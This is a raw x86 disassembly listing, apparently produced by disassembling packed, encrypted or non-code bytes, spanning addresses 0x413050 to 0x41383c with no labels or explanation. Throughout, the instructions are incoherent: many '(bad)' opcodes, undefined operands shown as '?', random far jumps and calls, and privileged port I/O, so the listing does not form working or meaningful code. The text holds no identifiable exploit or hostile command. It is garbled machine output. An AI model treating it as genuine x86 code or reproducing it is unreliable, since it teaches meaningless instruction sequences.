  413050:	scas   eax,DWORD PTR es:[edi]
  413051:	push   ds
  413052:	repnz cs call 0x292d:0xda1f404a
  41305b:	scas   al,BYTE PTR es:[edi]
  41305c:	and    esp,esi
  41305e:	in     al,0xd8
  413060:	jg     0x413076
  413062:	cmp    eax,0xbc296103
  413067:	push   eax
  413068:	iret   
  413069:	dec    esp
  41306a:	cwde   
  41306b:	ret    0xb495
  41306e:	lods   al,BYTE PTR ds:[esi]
  41306f:	in     al,0xd0
  413071:	fmul   st,st(4)
  413073:	dec    eax
  413074:	sar    BYTE PTR [edi-0x6a8bbb36],1
  41307a:	sub    BYTE PTR [ebx+0x3],cl
  41307d:	rol    BYTE PTR [edx+eax*1],1
  413080:	inc    ebx
  413081:	leave  
  413082:	mov    ds:0xaa42cc6,eax
  413087:	aad    0xa3
  413089:	sub    ecx,DWORD PTR [edi+0x1d]
  41308c:	stos   BYTE PTR es:[edi],al
  41308d:	adc    dh,BYTE PTR cs:[ebx+ebp*8]
  413091:	mov    ebx,0x756a3053
  413096:	(bad)  
  413097:	jmp    0x8d328c34
  41309c:	cmp    BYTE PTR [edi-0x18444345],bl
  4130a2:	int    0xb3
  4130a4:	(bad)  
  4130a6:	jl     0x4130c4
  4130a8:	jg     0x413074
  4130aa:	and    bl,BYTE PTR fs:[eax]
  4130ad:	push   edi
  4130ae:	inc    esp
  4130af:	cmp    eax,0xdd269556
  4130b4:	loope  0x413107
  4130b6:	test   DWORD PTR [edx],ebx
  4130b8:	pop    dx
  4130ba:	sub    eax,0x35cf333e
  4130bf:	cld    
  4130c0:	adc    eax,0xf2ca8c8a
  4130c5:	jmp    0x7bd9:0x7f2b739d
  4130cc:	cmp    al,0x9
  4130ce:	call   0xbe5da16e
  4130d3:	cmovne ebx,DWORD PTR [edx]
  4130d6:	pusha  
  4130d7:	mov    BYTE PTR [esi-0x2],bh
  4130da:	or     ecx,ebx
  4130dc:	mul    dh
  4130de:	fs stos DWORD PTR es:[edi],eax
  4130e0:	ficom  WORD PTR [edi+edx*2]
  4130e3:	lock mov cl,0xd5
  4130e6:	popf   
  4130e7:	js     0x4130d1
  4130e9:	dec    ebx
  4130ea:	enter  0xa21a,0xa8
  4130ee:	cmp    eax,0x46337fe0
  4130f3:	push   ds
  4130f4:	cdq    
  4130f5:	mov    ah,0xc8
  4130f7:	icebp  
  4130f8:	sti    
  4130f9:	and    DWORD PTR [ecx-0x2c],eax
  4130fc:	daa    
  4130fd:	inc    esi
  4130fe:	pop    ebx
  4130ff:	cmp    ah,bh
  413101:	(bad)  
  413102:	out    dx,al
  413103:	dec    ecx
  413104:	ins    DWORD PTR es:[edi],dx
  413105:	mov    al,ds:0x3421558d
  41310a:	and    DWORD PTR [ecx-0x1],eax
  41310d:	and    ebp,DWORD PTR ds:0x739db68a
  413113:	inc    edx
  413114:	in     al,dx
  413115:	jle    0x4130f4
  413117:	xchg   edi,eax
  413118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413119:	jnp    0x4130c0
  41311b:	sub    al,0x6c
  41311d:	pop    esp
  41311e:	mov    edi,0x5f28fbfc
  413123:	mov    cl,0x2
  413125:	js     0x4130f0
  413127:	jbe    0x413109
  413129:	in     al,dx
  41312a:	jnp    0x4130e2
  41312c:	outs   dx,DWORD PTR ds:[esi]
  41312d:	sbb    eax,0x1307b6a3
  413132:	lods   eax,DWORD PTR ds:[esi]
  413133:	lock icebp 
  413135:	ss stos DWORD PTR es:[edi],eax
  413137:	mov    esi,0x287499d1
  41313c:	jnp    0x41310e
  41313e:	retf   
  41313f:	mov    ebp,0x6cd2dc75
  413144:	cmp    al,BYTE PTR [edx]
  413146:	rcl    dl,cl
  413148:	xchg   edi,eax
  413149:	xor    DWORD PTR [ebx+0x35],edx
  41314c:	pop    ebx
  41314d:	cmc    
  41314e:	mov    al,ds:0x6b4a423d
  413153:	dec    edx
  413154:	pushf  
  413155:	mov    ?,WORD PTR [ebx-0xafd25fd]
  41315b:	pop    ebx
  41315c:	es pop esi
  41315e:	leave  
  41315f:	xchg   edi,eax
  413160:	pop    ss
  413161:	xchg   esi,eax
  413162:	pop    ds
  413163:	ja     0x4131dc
  413165:	jbe    0x413103
  413167:	icebp  
  413168:	jge    0x413193
  41316a:	xchg   BYTE PTR [ebx-0x3cf7a80b],ah
  413170:	cmp    dl,al
  413172:	and    eax,0x410340cf
  413177:	xchg   ebx,eax
  413178:	test   BYTE PTR [ecx+eax*2-0x5a],ah
  41317c:	enter  0x998c,0xd3
  413180:	icebp  
  413181:	mov    eax,eax
  413183:	mov    ch,0xca
  413185:	xchg   ch,ch
  413187:	repnz or eax,0xf452687
  41318d:	xchg   ebx,eax
  41318e:	ret    
  41318f:	mov    ds:0x63245e0,al
  413194:	xor    eax,0x5fcdc7dd
  413199:	fdivrp st(0),st
  41319b:	rcl    BYTE PTR [ebp-0x3e],1
  41319e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41319f:	imul   DWORD PTR [ebp+0x4b]
  4131a2:	in     al,dx
  4131a3:	mov    esi,0x58ea1f24
  4131a8:	div    BYTE PTR [edi-0x74]
  4131ab:	push   cs
  4131ac:	cwde   
  4131ad:	retf   0x8380
  4131b0:	or     ebp,DWORD PTR [esi-0xb4a561a]
  4131b6:	sbb    ch,BYTE PTR [esi-0x515c87cc]
  4131bc:	inc    edx
  4131bd:	ret    0xbfcc
  4131c0:	dec    ecx
  4131c1:	dec    ebp
  4131c2:	loope  0x413180
  4131c4:	clc    
  4131c5:	mov    esi,0x25a7fb51
  4131ca:	or     al,0xe1
  4131cc:	mov    ebx,0x863cdce3
  4131d1:	neg    DWORD PTR [edx+0x22]
  4131d4:	mov    ds:0xba345687,al
  4131d9:	sub    esi,edx
  4131db:	(bad)  
  4131dc:	jecxz  0x41322c
  4131de:	xor    DWORD PTR ss:[eax],ebx
  4131e1:	cli    
  4131e2:	pusha  
  4131e3:	jns    0x4131a5
  4131e5:	add    edi,ebp
  4131e7:	fmul   DWORD PTR [ecx+eiz*2+0x4d]
  4131eb:	pop    esi
  4131ec:	push   esi
  4131ed:	test   edi,ebp
  4131ef:	mov    edx,0xbfc78bee
  4131f4:	jge    0x41322e
  4131f6:	test   esp,ebx
  4131f8:	imul   ebx,DWORD PTR [edx],0x79bddfaa
  4131fe:	iret   
  4131ff:	fwait
  413200:	aad    0xa5
  413202:	jmp    0x41321a
  413204:	bnd jne 0x4131f2
  413207:	in     al,dx
  413208:	(bad)  
  413209:	iret   
  41320a:	cmp    eax,0xc3384e4c
  41320f:	bswap  esp
  413211:	jp     0x4131f8
  413213:	out    dx,eax
  413214:	cmp    eax,esi
  413216:	push   eax
  413217:	(bad)
  41321b:	xchg   BYTE PTR [esi+ecx*1+0x34f5dc5f],cl
  413222:	dec    DWORD PTR [ebx+ebx*2+0xe]
  413226:	inc    eax
  413227:	cdq    
  413228:	test   eax,0x9370ff7d
  41322d:	sub    dl,BYTE PTR [edi-0x1ddfc4e1]
  413233:	push   edx
  413234:	jmp    0x1965:0x7b932a5a
  41323b:	aad    0x8
  41323d:	or     al,0x8c
  41323f:	imul   ebp,ebp,0xffffffc9
  413242:	add    ecx,edi
  413244:	mov    al,0x92
  413246:	stos   BYTE PTR es:[edi],al
  413247:	push   ebp
  413248:	je     0x41320f
  41324a:	test   BYTE PTR [ebp-0x45a14d21],ch
  413250:	jne    0x41328e
  413252:	cdq    
  413253:	shl    BYTE PTR [edi-0x431967bf],0xa1
  41325a:	jmp    0x4131eb
  41325c:	(bad)  [ebx+0x40]
  41325f:	jmp    0x41325a
  413261:	sub    eax,0x26d75df8
  413266:	lahf   
  413267:	pusha  
  413268:	dec    edx
  413269:	mov    ebp,0xd5f942e0
  41326e:	jp     0x413211
  413270:	jnp    0x413249
  413272:	and    DWORD PTR [ecx],ebp
  413274:	lea    ebx,[edi-0x80]
  413277:	in     al,0xd5
  413279:	outs   dx,DWORD PTR ds:[esi]
  41327a:	xchg   esi,eax
  41327b:	jno    0x4132a1
  41327d:	jo     0x41328b
  41327f:	fmul   st,st(6)
  413281:	fld    TBYTE PTR [ecx+0x7e24272e]
  413287:	push   esi
  413288:	xor    eax,0x9026c7a
  41328d:	pop    esi
  41328e:	cmc    
  41328f:	push   eax
  413290:	xchg   esp,eax
  413291:	aas    
  413292:	sub    BYTE PTR [ecx-0x3a],0x85
  413296:	and    edi,edx
  413298:	sahf   
  413299:	mov    al,ds:0xcd28b2fa
  41329e:	popa   
  41329f:	arpl   ax,sp
  4132a1:	xlat   BYTE PTR ds:[ebx]
  4132a2:	adc    DWORD PTR fs:[ecx+0x3469915a],ecx
  4132a9:	sbb    eax,0x509c2677
  4132ae:	test   eax,0x330a69df
  4132b3:	or     BYTE PTR [ebx-0x1508847],bl
  4132b9:	xor    al,0x49
  4132bc:	sbb    BYTE PTR [ebx],cl
  4132be:	adc    eax,0xa5dda675
  4132c3:	je     0x4132df
  4132c5:	ds retf 
  4132c7:	cmp    DWORD PTR [eax+ebx*4+0x52ca7f54],esi
  4132ce:	mov    ebp,0xef0128ec
  4132d3:	rcl    DWORD PTR [ebx+edx*2+0x68],1
  4132d7:	sbb    al,0xa1
  4132d9:	fild   WORD PTR [edx-0x49e4b54e]
  4132df:	jns    0x4132c6
  4132e1:	and    al,0x41
  4132e4:	and    bl,bl
  4132e6:	les    eax,FWORD PTR [edx]
  4132e8:	add    al,0x2e
  4132ea:	je     0x413315
  4132ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132ed:	add    al,0xd6
  4132ef:	ret    
  4132f0:	or     al,0x12
  4132f2:	dec    ebx
  4132f3:	js     0x413324
  4132f5:	and    cl,BYTE PTR [eax-0x1f]
  4132f8:	bound  ebp,QWORD PTR [edx]
  4132fa:	cmp    DWORD PTR [ecx+0x29086cdd],eax
  413300:	inc    esp
  413301:	rol    BYTE PTR [ecx+0x5ec2bf9d],1
  413307:	inc    esi
  413308:	test   al,0x2b
  41330a:	xor    edi,ebx
  41330c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41330d:	or     eax,DWORD PTR [edi]
  41330f:	pop    ss
  413310:	pop    esi
  413311:	sub    BYTE PTR [ebx+0x2],bh
  413314:	xor    al,0x1f
  413316:	into   
  413317:	cdq    
  413318:	cmp    cl,BYTE PTR [esp+eax*1-0xf]
  41331c:	leave  
  41331d:	mov    ebx,DWORD PTR [esi]
  41331f:	(bad)  
  413320:	sub    DWORD PTR [ecx],edx
  413322:	aas    
  413323:	gs pop esp
  413325:	arpl   WORD PTR [edi+0x6ed6ef10],sp
  41332b:	push   0xfffffffe
  41332d:	fwait
  41332e:	nop
  41332f:	pop    edx
  413330:	and    edi,ebx
  413332:	cld    
  413333:	or     eax,0x7efd1913
  413338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413339:	jmp    0x6a29:0x39628217
  413340:	std    
  413341:	test   BYTE PTR [ebp+0x7b],bh
  413344:	inc    esi
  413345:	push   0x3e
  413347:	mov    edx,0x240a8ef6
  41334c:	shr    DWORD PTR [esi+esi*2-0x48],1
  413350:	jnp    0x4133c9
  413352:	test   eax,0xc9a5a7d1
  413357:	mov    bl,0x14
  413359:	jo     0x413396
  41335b:	lahf   
  41335c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41335d:	xchg   edi,eax
  41335e:	push   ebp
  41335f:	inc    eax
  413360:	sub    BYTE PTR [esi+ebp*1],ch
  413363:	push   es
  413364:	pusha  
  413365:	jp     0x413365
  413367:	inc    ebp
  413368:	sbb    esi,edx
  41336a:	addr16 dec ebx
  41336c:	add    DWORD PTR [edi],ebx
  41336e:	jecxz  0x4133de
  413370:	dec    ebx
  413371:	sti    
  413372:	hlt    
  413373:	test   al,0x2e
  413375:	sub    dh,BYTE PTR [eax]
  413377:	fcmovne st,st(7)
  413379:	shl    DWORD PTR [edi-0x34],cl
  41337c:	sbb    al,0x4d
  41337e:	lahf   
  41337f:	aaa    
  413380:	adc    BYTE PTR [esi],bl
  413382:	push   edi
  413383:	(bad)  
  413384:	sar    DWORD PTR [edi-0x848f38f],1
  41338a:	mov    ch,0xa5
  41338c:	mov    ch,0xeb
  41338e:	mov    WORD PTR [ebx+0x29a94f41],ds
  413394:	fldcw  WORD PTR [edi+0x431ed839]
  41339a:	pop    edi
  41339b:	popa   
  41339c:	or     bl,BYTE PTR [edx-0x2200f28e]
  4133a2:	and    al,0x59
  4133a4:	test   DWORD PTR [eax],0xa55b9fef
  4133aa:	imul   edx,DWORD PTR [esi],0xf413ed00
  4133b0:	dec    ebp
  4133b1:	ficom  WORD PTR [edi]
  4133b3:	xchg   esi,eax
  4133b4:	fcmovbe st,st(3)
  4133b6:	mov    ds,WORD PTR [esi-0x541927c]
  4133bc:	jbe    0x4133ab
  4133be:	push   cs
  4133bf:	cs xor al,0x1d
  4133c2:	retf   0xb126
  4133c5:	(bad)  
  4133c7:	fnstcw WORD PTR [ecx-0x8d12990]
  4133cd:	push   cs
  4133ce:	pop    es
  4133cf:	fiadd  WORD PTR [edi+ebp*2-0x79]
  4133d3:	cmp    esp,DWORD PTR ds:0x12053926
  4133d9:	xchg   ecx,eax
  4133da:	aaa    
  4133db:	cld    
  4133dc:	ds loop 0x413431
  4133df:	pop    ds
  4133e0:	(bad)  
  4133e1:	sbb    dh,BYTE PTR [ecx+0x4d06a3d6]
  4133e7:	inc    eax
  4133e8:	add    eax,0x2cabf494
  4133ed:	push   edx
  4133ee:	scas   eax,DWORD PTR es:[edi]
  4133ef:	(bad)  
  4133f0:	mov    dh,0x84
  4133f2:	mov    WORD PTR [edx+0x4ad6b12e],ds
  4133f8:	shl    DWORD PTR [ecx+esi*8-0x7f],0xdd
  4133fd:	in     al,dx
  4133fe:	push   0x7c
  413400:	dec    esp
  413401:	test   BYTE PTR [edi-0x75daffb0],cl
  413407:	gs inc edx
  413409:	into   
  41340a:	xlat   BYTE PTR ds:[ebx]
  41340b:	push   edx
  41340c:	pop    ss
  41340d:	cli    
  41340e:	jmp    0x99fcb032
  413413:	(bad)  
  413414:	mov    ?,WORD PTR [esi-0x37]
  413417:	dec    edi
  413418:	out    dx,al
  413419:	pop    ss
  41341a:	mov    edi,0xe7b89260
  41341f:	inc    ebx
  413420:	ins    DWORD PTR es:[edi],dx
  413421:	mov    WORD PTR [ebx-0x2b61883e],?
  413427:	dec    ebp
  413428:	hlt    
  413429:	aas    
  41342a:	fwait
  41342b:	xchg   ecx,eax
  41342c:	add    BYTE PTR [edi+0x4f58380e],ah
  413432:	scas   eax,DWORD PTR es:[edi]
  413433:	aaa    
  413434:	jle    0x41346a
  413436:	jmp    0x41348c
  413438:	push   es
  413439:	xor    BYTE PTR [eax+0x6b3781fe],bh
  41343f:	dec    edx
  413440:	or     eax,0x8756bafe
  413445:	xchg   edi,edi
  413447:	stos   BYTE PTR es:[edi],al
  413448:	punpcklwd mm0,mm2
  41344b:	sysenter 
  41344d:	inc    ecx
  41344e:	jns    0x4134bb
  413450:	cmp    eax,0x5c8633c
  413455:	pop    edx
  413456:	adc    al,0x55
  413458:	loope  0x413401
  41345a:	test   eax,0x9db91d23
  41345f:	dec    edx
  413460:	lods   al,BYTE PTR ds:[esi]
  413461:	mov    esp,edi
  413463:	retf   
  413464:	pop    edx
  413465:	fisttp WORD PTR [edi]
  413467:	or     esi,DWORD PTR [edi+0x13b2ea76]
  41346d:	push   ecx
  41346e:	jle    0x41343c
  413470:	ins    BYTE PTR es:[edi],dx
  413471:	mov    ecx,0x7837ba5
  413476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413477:	push   esp
  413478:	adc    DWORD PTR [esi+0x21],esi
  41347b:	mov    DWORD PTR [ebx+0xb],edi
  41347e:	inc    esp
  41347f:	xchg   DWORD PTR [ecx],ecx
  413481:	mov    esi,0x6a7a8d80
  413486:	pop    esi
  413487:	add    DWORD PTR [esi+0x395a186f],edi
  41348d:	loop   0x4134da
  41348f:	hlt    
  413490:	repz sub eax,0xc52da881
  413496:	js     0x41343a
  413498:	sbb    ah,BYTE PTR [esi+0x8a5ae72]
  41349e:	cmp    ebx,DWORD PTR [edi]
  4134a0:	cld    
  4134a1:	xchg   edx,eax
  4134a2:	push   edx
  4134a3:	in     eax,0x21
  4134a5:	out    0x34,eax
  4134a7:	out    0xf7,eax
  4134a9:	pop    esp
  4134aa:	mov    dh,0xdb
  4134ac:	or     al,0xac
  4134ae:	fisttp DWORD PTR [edx]
  4134b0:	(bad)  [edx-0x4ef87aff]
  4134b6:	lods   al,BYTE PTR ds:[esi]
  4134b7:	inc    eax
  4134b8:	jbe    0x413486
  4134ba:	inc    ebx
  4134bb:	js     0x4134af
  4134bd:	mov    al,0x3a
  4134bf:	addr16 xchg edi,eax
  4134c1:	mov    ah,0x56
  4134c3:	cwde   
  4134c4:	shr    DWORD PTR ds:[ebx-0x5432e8f4],0xf1
  4134cc:	data16 daa 
  4134ce:	add    BYTE PTR [eax-0x2be23231],dl
  4134d4:	mov    esp,0x24da2f8a
  4134d9:	aad    0x2a
  4134db:	retf   
  4134dc:	push   esp
  4134dd:	out    dx,eax
  4134de:	ss stos BYTE PTR es:[edi],al
  4134e0:	retf   
  4134e1:	push   esi
  4134e2:	test   al,0xaa
  4134e4:	xchg   ecx,eax
  4134e5:	push   es
  4134e6:	cmp    BYTE PTR [esi+0x2b],ch
  4134e9:	das    
  4134ea:	or     dl,al
  4134ec:	adc    BYTE PTR [edx],dh
  4134ee:	push   ss
  4134ef:	push   edx
  4134f0:	dec    ebp
  4134f1:	arpl   WORD PTR [ecx-0x4ecd79f6],dx
  4134f7:	(bad)  
  4134f8:	push   ds
  4134f9:	retf   0x4177
  4134fc:	xor    DWORD PTR [edx-0x7c],0xd05714d2
  413503:	call   FWORD PTR [eax+0x75ee6484]
  413509:	adc    DWORD PTR [eax],esi
  41350b:	clc    
  41350c:	ja     0x41349d
  41350e:	cmp    al,BYTE PTR [ebp-0x58]
  413511:	js     0x413579
  413513:	test   DWORD PTR [edx],edi
  413515:	and    BYTE PTR [ebp-0x3158d3f3],0x5e
  41351c:	pop    ss
  41351d:	cmp    ebp,DWORD PTR [ebp-0x21]
  413520:	pop    edi
  413521:	ins    DWORD PTR es:[edi],dx
  413522:	leave  
  413523:	push   ebp
  413524:	dec    esp
  413525:	lods   al,BYTE PTR ds:[esi]
  413526:	sbb    BYTE PTR [edi-0x7c],ah
  413529:	jae    0x413545
  41352b:	jb     0x413506
  41352d:	inc    ecx
  41352e:	adc    ah,dh
  413530:	push   ebx
  413531:	pusha  
  413532:	inc    esi
  413533:	shl    ah,0x6a
  413536:	jecxz  0x413522
  413538:	and    DWORD PTR [edi],ebp
  41353a:	in     al,0x71
  41353c:	imul   edi,DWORD PTR [esi+0x4e],0xf7728af6
  413543:	ret    
  413544:	mov    edi,0xdc99c045
  413549:	add    DWORD PTR [edx-0x27c1b190],edx
  41354f:	xor    cl,BYTE PTR [ecx+0x31]
  413552:	xchg   ebp,eax
  413553:	mov    dh,BYTE PTR [ebx-0x2f2ee9ea]
  413559:	push   edx
  41355a:	shl    BYTE PTR [edi-0xc],cl
  41355d:	sub    ch,BYTE PTR [eax]
  41355f:	push   ss
  413560:	xor    al,0x9d
  413562:	push   ecx
  413563:	ja     0x413583
  413565:	(bad)  
  413566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413567:	add    ah,bl
  413569:	sub    eax,0x1e75e5ef
  41356e:	clc    
  41356f:	adc    bh,dh
  413571:	mov    al,ds:0xc88fab06
  413576:	mov    esi,0x6aa3740f
  41357b:	out    0x3a,al
  41357d:	js     0x413535
  41357f:	jae    0x413502
  413581:	cmp    edx,DWORD PTR [ebp-0x65]
  413584:	aad    0x3a
  413586:	pop    edi
  413587:	test   DWORD PTR [ebx+0x6bd8b28e],0x2f612cee
  413591:	sti    
  413592:	ss aad 0x50
  413595:	xor    ah,BYTE PTR [ebp-0x2d]
  413598:	(bad)  
  413599:	pop    eax
  41359a:	jp     0x4135f7
  41359c:	icebp  
  41359d:	push   0x16deef87
  4135a2:	sbb    al,0xb5
  4135a4:	lods   al,BYTE PTR ds:[esi]
  4135a5:	sub    esi,DWORD PTR [edi]
  4135a7:	mov    edx,0xba36175a
  4135ac:	mov    eax,ds:0x81a31782
  4135b1:	pop    ds
  4135b2:	shl    BYTE PTR [ebp+0x5e],1
  4135b5:	sub    BYTE PTR [edi+0x55a47370],dh
  4135bb:	out    0x2c,eax
  4135bd:	fidiv  WORD PTR [edx-0x5d4a87ea]
  4135c3:	or     ecx,ebx
  4135c5:	cmp    edx,eax
  4135c7:	stc    
  4135c8:	je     0x4135ba
  4135ca:	sbb    DWORD PTR [edx+ecx*2-0x62c39832],eax
  4135d1:	mov    fs,WORD PTR [eax]
  4135d3:	dec    esp
  4135d4:	add    DWORD PTR [ecx+ecx*8-0x53f4a0d2],edi
  4135db:	fist   DWORD PTR [ebp-0x6667a543]
  4135e1:	arpl   WORD PTR [eax],sp
  4135e3:	data16 mov al,0x73
  4135e6:	retf   0x8ea9
  4135e9:	push   0x41
  4135eb:	add    esi,DWORD PTR ds:0xe1198ebc
  4135f1:	mov    BYTE PTR [eax+0x61a30a65],bh
  4135f7:	test   ch,dl
  4135f9:	adc    dh,bh
  4135fb:	data16 ins BYTE PTR es:[edi],dx
  4135fd:	dec    BYTE PTR [eax+0x4176e12f]
  413603:	dec    esi
  413604:	dec    esp
  413605:	test   BYTE PTR [edx-0x2d],dh
  413608:	jl     0x4135c8
  41360a:	cmp    edx,DWORD PTR [ebp+0x7df252f9]
  413610:	mov    bh,0xd8
  413612:	and    eax,0xbc5b4232
  413617:	mov    edi,0x3b4901d7
  41361c:	add    al,0x50
  41361e:	es clc 
  413620:	in     al,dx
  413621:	shl    bl,0x31
  413624:	fst    DWORD PTR [esi+esi*2+0x4c609d8f]
  41362b:	pop    ebx
  41362c:	xor    bh,BYTE PTR [ebp+0x46]
  41362f:	fwait
  413630:	outs   dx,BYTE PTR ds:[esi]
  413631:	push   esi
  413632:	call   0xa8b1:0xa99914a5
  413639:	(bad)  
  41363a:	jge    0x4135db
  41363c:	fcomp  DWORD PTR [ebx]
  41363e:	mov    bh,0xff
  413640:	push   cs
  413641:	or     BYTE PTR [edi+eax*2+0xe900faa],ch
  413648:	fstp   DWORD PTR [edi]
  41364a:	(bad)  
  41364b:	jge    0x41368f
  41364d:	jmp    0x1f42c4fa
  413652:	clc    
  413653:	pop    edx
  413654:	int3   
  413655:	pop    ebx
  413656:	mov    esp,0x23bb27e9
  41365b:	mov    dh,bl
  41365d:	enter  0x518,0xd
  413661:	sbb    eax,0x253698f8
  413666:	inc    BYTE PTR [edi]
  413668:	stc    
  413669:	xor    esi,esp
  41366b:	add    DWORD PTR [ebx-0x11],0xfffffffd
  41366f:	int3   
  413670:	adc    al,0x96
  413672:	xlat   BYTE PTR ds:[ebx]
  413673:	(bad)  
  413674:	dec    esi
  413675:	(bad)  
  413676:	sti    
  413677:	push   es
  413678:	mov    dh,0x18
  41367a:	dec    edx
  41367b:	and    al,0xe1
  41367d:	xchg   edi,eax
  41367e:	(bad)  
  41367f:	loopne 0x413681
  413681:	jg     0xb440d458
  413687:	dec    ebx
  413688:	iret   
  413689:	pop    edi
  41368a:	out    dx,eax
  41368b:	xlat   BYTE PTR ds:[ebx]
  41368c:	pop    ebp
  41368d:	nop
  41368e:	adc    al,0x59
  413690:	out    0xb6,al
  413692:	push   cs
  413693:	push   esi
  413694:	popa   
  413695:	outs   dx,BYTE PTR ds:[esi]
  413696:	(bad)  
  413698:	jbe    0x413659
  41369a:	xchg   DWORD PTR [edx-0x131472df],ebx
  4136a0:	lea    esp,[edi]
  4136a2:	sub    eax,0x1a41a624
  4136a7:	ret    0x29b1
  4136aa:	addr16 daa 
  4136ac:	mov    esp,0xfa29dee3
  4136b1:	sbb    al,0x56
  4136b3:	lods   al,BYTE PTR ds:[esi]
  4136b4:	call   0x9b48:0xb358b6e2
  4136bb:	jl     0x4136b2
  4136bd:	cwde   
  4136be:	or     eax,0x2554fdd8
  4136c3:	sbb    al,0x2f
  4136c5:	stos   DWORD PTR es:[edi],eax
  4136c6:	pop    ebp
  4136c7:	or     ecx,DWORD PTR [esi+0x32]
  4136ca:	je     0x4136e5
  4136cc:	call   0xf416:0xfbc42c37
  4136d3:	test   al,0xaf
  4136d5:	inc    esp
  4136d6:	repnz fist WORD PTR [ebx+0x36]
  4136da:	xchg   edx,eax
  4136db:	lds    edx,FWORD PTR [esi+0x49483f99]
  4136e1:	add    esp,edx
  4136e3:	cld    
  4136e4:	dec    ecx
  4136e5:	or     esi,0xa0b35961
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	repz inc ebp
  4136ee:	inc    esp
  4136ef:	idiv   al
  4136f1:	push   0x36
  4136f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136f4:	pop    ebx
  4136f5:	sbb    al,ah
  4136f7:	ins    DWORD PTR es:[edi],dx
  4136f8:	int    0xf1
  4136fa:	mov    edx,0xe82ca3aa
  4136ff:	cmp    DWORD PTR ds:[ebx],ebx
  413702:	or     ebx,ecx
  413704:	stos   BYTE PTR es:[edi],al
  413705:	push   ebx
  413706:	popf   
  413707:	inc    ebx
  413708:	fwait
  413709:	jecxz  0x41370e
  41370b:	jnp    0x41372a
  41370d:	cmp    edx,ecx
  41370f:	and    al,0xb0
  413711:	add    BYTE PTR [eax],bh
  413713:	cmp    bh,al
  413715:	stc    
  413716:	fsub   QWORD PTR [esi+0x36]
  413719:	cwde   
  41371a:	mov    bl,0xe1
  41371c:	mov    ecx,0xafcb2f63
  413721:	push   esi
  413722:	xor    DWORD PTR [edi],esp
  413724:	(bad)
  413727:	stos   DWORD PTR es:[edi],eax
  413728:	add    eax,ecx
  41372a:	ins    BYTE PTR es:[edi],dx
  41372b:	scas   eax,DWORD PTR es:[edi]
  41372c:	add    ah,BYTE PTR [ecx]
  41372e:	adc    eax,0xe3df3501
  413733:	in     al,0xe8
  413735:	xchg   DWORD PTR [edx+0xeecb16b],eax
  41373b:	inc    ecx
  41373c:	or     esp,DWORD PTR [esi+eiz*4]
  41373f:	nop
  413740:	or     eax,0xd806df8
  413745:	jo     0x413759
  413747:	or     DWORD PTR [eax+0x73278fae],eax
  41374d:	pop    esi
  41374e:	add    cl,bl
  413750:	rcr    DWORD PTR [edi],0x3
  413753:	aad    0x51
  413755:	ds and eax,0x8676b342
  41375b:	jae    0x413705
  41375d:	adc    eax,0x64db44a1
  413762:	xchg   edi,eax
  413763:	in     eax,dx
  413764:	pop    eax
  413765:	dec    dl
  413767:	mov    fs,eax
  413769:	dec    ebp
  41376a:	fs pop esi
  41376c:	enter  0x49b8,0x68
  413770:	push   esi
  413771:	rol    ecx,cl
  413773:	aam    0x4b
  413775:	jo     0x413765
  413777:	out    0xab,al
  413779:	jp     0x4137c4
  41377b:	add    BYTE PTR [edx+0x55fbf6c2],al
  413781:	ds popa 
  413783:	inc    edi
  413784:	push   esp
  413785:	push   ebp
  413786:	pop    ds
  413787:	dec    edi
  413788:	aaa    
  413789:	cmp    esp,0xfffffff2
  41378c:	jo     0x4137ab
  41378e:	sbb    DWORD PTR [ecx],esp
  413790:	add    BYTE PTR [ebp+0x1],ah
  413793:	xor    dh,BYTE PTR [ebp-0x2841bcf2]
  413799:	mov    WORD PTR [ecx],fs
  41379b:	jmp    0x360f:0x920ab070
  4137a2:	adc    DWORD PTR ds:0x948ad672,eax
  4137a8:	stos   DWORD PTR es:[edi],eax
  4137a9:	(bad)  
  4137aa:	pop    edx
  4137ab:	ss loope 0x4137ea
  4137ae:	xchg   edx,eax
  4137af:	jmp    0x98bd:0xbc1d314e
  4137b6:	lea    edi,[esi+0x66]
  4137b9:	in     eax,0x33
  4137bb:	dec    esp
  4137bc:	jg     0x4137f5
  4137be:	rcl    BYTE PTR [esi-0x16203bf9],1
  4137c4:	sahf   
  4137c5:	loopne 0x41375b
  4137c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137c8:	cmp    cl,0xe
  4137cb:	mov    ch,0x3a
  4137cd:	ret    
  4137ce:	jmp    0x41379b
  4137d0:	push   eax
  4137d1:	push   0xffffffed
  4137d3:	loopne 0x41383f
  4137d5:	mov    cl,0x4f
  4137d7:	pushf  
  4137d8:	stos   BYTE PTR es:[edi],al
  4137d9:	cli    
  4137da:	and    al,0xd6
  4137dc:	adc    DWORD PTR [esi],edx
  4137de:	out    0xe,eax
  4137e0:	push   edx
  4137e1:	push   ds
  4137e2:	imul   esi,eax,0x32
  4137e5:	out    dx,eax
  4137e6:	out    0x95,eax
  4137e8:	dec    edi
  4137e9:	(bad)  
  4137ea:	pop    ds
  4137eb:	call   0x4505:0xd3696353
  4137f2:	mov    eax,ds:0xb69f46b9
  4137f7:	mov    al,ds:0xc59a642b
  4137fc:	sub    al,0x34
  4137fe:	jmp    0xac0f:0x4073bf7e
  413805:	and    BYTE PTR [ebp-0x491e61e2],bh
  41380b:	and    ecx,DWORD PTR [ebp+0x4e]
  41380e:	and    dh,BYTE PTR [edi-0x55]
  413811:	(bad)  
  413812:	out    0xdd,eax
  413814:	xchg   bh,dl
  413816:	add    DWORD PTR [ebx+ecx*8],esp
  413819:	xchg   BYTE PTR [ebp+eiz*8-0x42],dh
  41381d:	mov    ebp,0xe7778f5d
  413822:	nop
  413823:	mov    esi,edi
  413825:	rcl    DWORD PTR [esi+edi*8],1
  413828:	pop    esp
  413829:	sbb    ecx,DWORD PTR [esp+ecx*2]
  41382c:	(bad)  
  41382d:	les    edx,FWORD PTR [esi*8+0x410c6c65]
  413834:	arpl   WORD PTR [eax-0x5d159076],ax
  41383a:	aam    0x87
  41383c:	test   al,0x9
